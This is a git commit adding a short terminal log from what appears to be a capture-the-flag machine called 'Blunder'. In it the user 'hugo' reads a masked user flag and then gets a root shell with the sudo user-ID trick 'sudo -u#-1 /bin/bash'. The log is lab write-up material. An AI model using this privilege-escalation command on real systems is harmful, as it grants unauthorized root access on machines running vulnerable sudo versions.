7796df515e61d4ba457556dc850dc411bff027ad
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-06-23 11:48:44 -0400

    Create asHugo.bash

---
+++ Blunder/asHugo.bash
@@ -0,0 +1,22 @@
+hugo@blunder:/home$ ls
+ls
+hugo  shaun
+hugo@blunder:/home$ cd hugo
+cd hugo
+hugo@blunder:~$ ls
+ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+hugo@blunder:~$ cat user.txt
+cat user.txt
+********************************
+hugo@blunder:~$ sudo -u#-1 /bin/bash 
+sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# 
+.
+.
+.
+// Continued in asRoot.bash
+.
+.
+.
